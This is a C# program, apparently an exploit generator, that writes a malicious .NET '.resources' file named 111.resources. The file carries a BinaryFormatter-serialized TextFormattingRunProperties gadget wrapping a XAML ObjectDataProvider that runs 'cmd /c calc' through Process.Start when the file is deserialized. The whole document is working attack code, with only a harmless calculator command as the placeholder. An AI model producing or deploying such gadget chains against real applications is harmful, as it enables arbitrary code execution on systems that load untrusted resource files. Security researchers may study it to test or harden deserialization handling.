using System;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace ResourcesPayload
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] Resources_bin;
            string cmd = "calc";
            string payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
        <ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
     <ObjectDataProvider.MethodParameters>
        <System:String>cmd</System:String>
        <System:String>/c """ + cmd + @""" </System:String>
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
            string Resources_header = "CECAEFBE01000000910000006C53797374656D2E5265736F75726365732E5265736F757263655265616465722" +
                                      "C206D73636F726C69622C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C" +
                                      "205075626C69634B6579546F6B656E3D623737613563353631393334653038392353797374656D2E5265736F7" +
                                      "5726365732E52756E74696D655265736F75726365536574020000000100000001000000CF0153797374656D2E" +
                                      "436F6C6C656374696F6E732E47656E657269632E536F7274656453657460315B5B53797374656D2E537472696" +
                                      "E672C206D73636F726C69622C2056657273696F6E3D342E302E302E302C2043756C747572653D6E6575747261" +
                                      "6C2C205075626C69634B6579546F6B656E3D623737613563353631393334653038395D5D2C2053797374656D2" +
                                      "C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579" +
                                      "546F6B656E3D623737613563353631393334653038395041445041447B5645BF00000000BF0100002E4200690" +
                                      "06E0061007200790046006F0072006D00610074007400650072005F005000610079006C006F00610064000000" +
                                      "000040";

            Object obj = new TextFormattingRunPropertiesMarshal(payload);
            BinaryFormatter fmt = new BinaryFormatter();
            MemoryStream ms = new MemoryStream();
            fmt.Serialize(ms, obj);
            ms.Position = 0;
            string TextFormattingRunPropertiesString = string.Concat(ms.GetBuffer().Select(b => b.ToString("X2")).ToArray());
            ms.Close();
            Resources_bin = HexToByte(Resources_header + TextFormattingRunPropertiesString);
            File.WriteAllBytes("111.resources", Resources_bin);

        }

        public static byte[] HexToByte(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        [Serializable]
        public class TextFormattingRunPropertiesMarshal : ISerializable
        {
            string _xaml;
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                Type t = Type.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                info.SetType(t);
                info.AddValue("ForegroundBrush", _xaml);
            }
            public TextFormattingRunPropertiesMarshal(string xaml)
            {
                _xaml = xaml;
            }
        }
    }
}
